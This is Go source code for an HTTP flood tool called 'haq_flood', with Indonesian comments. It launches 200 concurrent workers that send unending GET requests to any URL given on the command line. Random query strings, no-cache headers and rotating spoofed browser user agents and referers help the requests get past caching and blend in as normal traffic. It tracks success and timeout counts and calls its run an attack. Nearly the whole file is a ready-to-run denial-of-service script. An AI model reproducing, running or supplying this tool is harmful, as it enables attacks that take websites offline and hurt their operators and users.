package main

import (
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// --- Konfigurasi ---
const (
	numThreads         = 200 // Jumlah goroutine worker
	randomStringMin    = 3
	randomStringMax    = 10
	keepAliveMin       = 110
	keepAliveMax       = 120
	reportIntervalSec  = 5 // Detik
	requestTimeoutSec  = 15 // Detik
)

// --- Data Statis ---
var userAgents = []string{
	"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
	"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)",
	"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
	"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
	"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
}

var referers = []string{
	"http://www.google.com/?q=",
	"http://www.usatoday.com/search/results?q=",
	"http://engadget.search.aol.com/search?q=",
}

// --- Status Codes ---
const (
	statusSuccess = iota // 0
	statusFailed         // 1
	statusTimeout        // 2
)

// --- State Management ---
type AttackState struct {
	requestCounter  atomic.Uint64 // Total upaya request
	successCounter  atomic.Uint64 // Request yang berhasil (mendapat respons non-error/non-timeout)
	failedCounter   atomic.Uint64 // Request yang gagal (error tapi bukan timeout)
	timeoutCounter  atomic.Uint64 // Request yang timeout
	stopAttack      chan struct{} // Channel untuk memberi sinyal berhenti
	attackFinished  chan struct{} // Channel untuk menandai serangan selesai
	host            string        // Host:port
	targetURL       string        // URL lengkap yang ditargetkan
	safeMode        bool
	debugMode       bool
	hostFullURL     string // Menyimpan scheme://host:port
}

func newState() *AttackState {
	return &AttackState{
		stopAttack:     make(chan struct{}),
		attackFinished: make(chan struct{}),
	}
}

func (s *AttackState) SetTarget(targetURL string) error {
	u, err := url.Parse(targetURL)
	if err != nil {
		return fmt.Errorf("URL target tidak valid: %w", err)
	}
	if u.Scheme != "http" && u.Scheme != "https" {
		return fmt.Errorf("skema URL harus 'http' atau 'https'")
	}
	s.targetURL = targetURL
	s.hostFullURL = fmt.Sprintf("%s://%s", u.Scheme, u.Host) // scheme://host:port
	s.host = u.Host                                          // Hanya host:port
	// Append referer dinamis, pastikan tidak ada duplikat jika script dijalankan berulang kali dalam satu sesi
	found := false
	for _, r := range referers {
		if r == s.hostFullURL+"/" {
			found = true
			break
		}
	}
	if !found {
		referers = append(referers, s.hostFullURL+"/")
	}
	return nil
}

func (s *AttackState) RecordStatus(status int) {
	s.requestCounter.Add(1)
	switch status {
	case statusSuccess:
		s.successCounter.Add(1)
	case statusFailed:
		s.failedCounter.Add(1)
	case statusTimeout:
		s.timeoutCounter.Add(1)
	}
}

func (s *AttackState) Stop() {
	select {
	case <-s.stopAttack:
		// Channel sudah ditutup
	default:
		close(s.stopAttack)
	}
}

func (s *AttackState) Finish() {
	select {
	case <-s.attackFinished:
		// Channel sudah ditutup
	default:
		close(s.attackFinished)
	}
}

func (s *AttackState) IsStopped() bool {
	select {
	case <-s.stopAttack:
		return true
	default:
		return false
	}
}

func (s *AttackState) IsFinished() bool {
	select {
	case <-s.attackFinished:
		return true
	default:
		return false
	}
}

// --- Helper Functions ---
func buildRandomString(size int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, size)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return string(b)
}

func getRandomUserAgent() string {
	return userAgents[rand.Intn(len(userAgents))]
}

func getRandomReferer(state *AttackState) string {
	ref := referers[rand.Intn(len(referers))]
	refHostMatch := regexp.MustCompile(`^https?://([^/:]+)`)
	refHost := ""
	if matches := refHostMatch.FindStringSubmatch(ref); len(matches) > 1 {
		refHost = matches[1]
	}

	currentStateHost := strings.Split(state.host, ":")[0]

	if refHost != "" && refHost == currentStateHost {
		return ref + buildRandomString(rand.Intn(randomStringMax-randomStringMin+1)+randomStringMin)
	}
	return ref + buildRandomString(rand.Intn(randomStringMax-randomStringMin+1)+randomStringMin)
}

func createHTTPRequest(targetURL string, host string, state *AttackState) (*http.Request, error) {
	paramJoiner := "?"
	if strings.Contains(targetURL, "?") {
		paramJoiner = "&"
	}
	randomParamName := buildRandomString(rand.Intn(randomStringMax-randomStringMin+1) + randomStringMin)
	randomParamValue := buildRandomString(rand.Intn(randomStringMax-randomStringMin+1) + randomStringMin)
	finalURL := targetURL + paramJoiner + randomParamName + "=" + randomParamValue

	req, err := http.NewRequest("GET", finalURL, nil)
	if err != nil {
		return nil, fmt.Errorf("gagal membuat request: %w", err)
	}

	req.Header.Set("User-Agent", getRandomUserAgent())
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Accept-Charset", "ISO-8859-1,utf-8;q=0.7,*;q=0.7")
	req.Header.Set("Referer", getRandomReferer(state))
	req.Header.Set("Keep-Alive", strconv.Itoa(rand.Intn(keepAliveMax-keepAliveMin+1)+keepAliveMin))
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Host", host)

	return req, nil
}

// --- Goroutines ---

func worker(state *AttackState, wg *sync.WaitGroup) {
	defer wg.Done()

	transport := &http.Transport{
		MaxIdleConns:          100,
		IdleConnTimeout:       90 * time.Second,
		TLSHandshakeTimeout:   10 * time.Second,
		ResponseHeaderTimeout: time.Duration(requestTimeoutSec) * time.Second,
		ExpectContinueTimeout: 1 * time.Second,
		DialContext: (&net.Dialer{
			Timeout:   10 * time.Second,
			KeepAlive: 30 * time.Second,
		}).DialContext,
		Proxy: http.ProxyFromEnvironment,
	}
	client := &http.Client{
		Transport: transport,
		Timeout:   time.Duration(requestTimeoutSec) * time.Second,
	}

	for {
		select {
		case <-state.stopAttack:
			if state.debugMode {
				fmt.Printf("[DEBUG GOROUTINE %d] Menerima sinyal berhenti.\n", getGoroutineID())
			}
			return
		default:
			// Lanjutkan
		}

		if state.IsStopped() || state.targetURL == "" {
			if state.debugMode {
				fmt.Printf("[DEBUG GOROUTINE %d] State dihentikan atau target kosong, keluar.\n", getGoroutineID())
			}
			return
		}

		req, err := createHTTPRequest(state.targetURL, state.host, state)
		if err != nil {
			if state.debugMode {
				fmt.Printf("[DEBUG GOROUTINE %d] Error createHTTPRequest: %v\n", getGoroutineID(), err)
			}
			state.RecordStatus(statusFailed) // Catat sebagai gagal jika request gagal dibuat
			time.Sleep(100 * time.Millisecond)
			continue
		}

		resp, err := client.Do(req)
		
		// Selalu increment total request counter di sini
		// Status spesifik dicatat setelahnya
		
		if err != nil {
			if state.debugMode {
				fmt.Printf("[DEBUG GOROUTINE %d] Error client.Do: %v\n", getGoroutineID(), err)
			}

			var timeoutErr bool
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				timeoutErr = true
			}
			if strings.Contains(err.Error(), "timed out") {
				timeoutErr = true
			}

			if timeoutErr {
				state.RecordStatus(statusTimeout) // Catat sebagai timeout
				if state.debugMode {
					fmt.Printf("[DEBUG GOROUTINE %d] Timeout terdeteksi pada request ke %s\n", getGoroutineID(), state.targetURL)
				}
			} else if strings.Contains(err.Error(), "refused") {
				state.RecordStatus(statusFailed) // Catat sebagai gagal
				if state.debugMode {
					fmt.Printf("[DEBUG GOROUTINE %d] Koneksi ditolak oleh server: %s\n", getGoroutineID(), state.targetURL)
				}
			} else {
				state.RecordStatus(statusFailed) // Catat sebagai gagal
				fmt.Printf("\n[ERROR GOROUTINE %d] Error tak terduga saat request: %v\n", getGoroutineID(), err)
				state.Stop()
				return
			}

			if resp != nil && resp.Body != nil {
				io.Copy(io.Discard, resp.Body)
				resp.Body.Close()
			}
			time.Sleep(100 * time.Millisecond)
			continue
		}

		// Jika sampai sini, request berhasil mendapatkan respons
		state.RecordStatus(statusSuccess) // Catat sebagai sukses

		if state.debugMode {
			fmt.Printf("[DEBUG GOROUTINE %d] Sukses: Status %d untuk %s\n", getGoroutineID(), resp.StatusCode, state.targetURL)
		}

		if state.safeMode && resp.StatusCode >= 500 {
			fmt.Printf("\n[INFO] Terdeteksi Response Code %d. Mode aman aktif, menghentikan serangan.\n", resp.StatusCode)
			state.Stop()
		}

		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()

		if state.IsStopped() {
			return
		}
	}
}

func monitor(state *AttackState, wg *sync.WaitGroup) {
	defer wg.Done()
	lastReportTime := time.Now()

	ticker := time.NewTicker(time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-state.stopAttack:
			if state.debugMode {
				fmt.Printf("[DEBUG MONITOR] Menerima sinyal berhenti.\n")
			}
			totalSent := state.requestCounter.Load()
			success := state.successCounter.Load()
			failed := state.failedCounter.Load()
			timeout := state.timeoutCounter.Load()
			fmt.Printf("[%s] Total: %d | Sukses: %d | Gagal: %d | Timeout: %d\n",
				time.Now().Format("15:04:05"), totalSent, success, failed, timeout)
			state.Finish()
			return
		case <-ticker.C:
			currentTime := time.Now()
			if currentTime.Sub(lastReportTime) >= time.Duration(reportIntervalSec)*time.Second {
				totalSent := state.requestCounter.Load()
				success := state.successCounter.Load()
				failed := state.failedCounter.Load()
				timeout := state.timeoutCounter.Load()
				fmt.Printf("[%s] Total: %d | Sukses: %d | Gagal: %d | Timeout: %d\n",
					time.Now().Format("15:04:05"), totalSent, success, failed, timeout)
				lastReportTime = currentTime
			}
		}
	}
}

func getGoroutineID() uint64 {
	var buf [64]byte
	n := runtime.Stack(buf[:], false)
	idField := strings.Fields(string(buf[:n]))[0]
	id, _ := strconv.ParseUint(idField, 10, 64)
	return id
}

func printUsage() {
	fmt.Println("RUN: ./haq_flood <url> [safe] [debug]")
	fmt.Println("  <url>: Alamat target (http:// atau https://)")
	fmt.Println("  [safe]: Opsional. Berhenti otomatis jika response code >= 500.")
	fmt.Println("  [debug]: Opsional. Aktifkan mode debug untuk log detail.")
}

func main() {
	rand.Seed(time.Now().UnixNano())

	if len(os.Args) < 2 {
		printUsage()
		os.Exit(1)
	}

	targetURL := os.Args[1]
	safeMode := false
	debugMode := false

	for i := 2; i < len(os.Args); i++ {
		switch strings.ToLower(os.Args[i]) {
		case "safe":
			safeMode = true
		case "debug":
			debugMode = true
		}
	}

	state := newState()
	state.safeMode = safeMode
	state.debugMode = debugMode

	if err := state.SetTarget(targetURL); err != nil {
		fmt.Fprintf(os.Stderr, "[ERROR] %v\n", err)
		os.Exit(1)
	}

	fmt.Printf("  Target URL: %s\n", state.targetURL)
	fmt.Printf("  Host: %s\n", state.host)
	fmt.Printf("  Goroutine: %d\n", numThreads)
	if state.safeMode {
		fmt.Println("  Safe mode aktif")
	}
	if state.debugMode {
		fmt.Println("  Debug mode aktif")
	}
	fmt.Println("  GAS DITAMPOL GASS POOLL")
  fmt.Println("  =======================")
	var wg sync.WaitGroup

	wg.Add(1)
	go monitor(state, &wg)

	for i := 0; i < numThreads; i++ {
		wg.Add(1)
		go worker(state, &wg)
	}

	wg.Wait()

	if !state.IsFinished() {
		state.Finish()
	}

	fmt.Printf("\n[INFO] Total request terkirim: %d\n", state.requestCounter.Load())
	fmt.Println("[INFO] -- Serangan Selesai --")
}

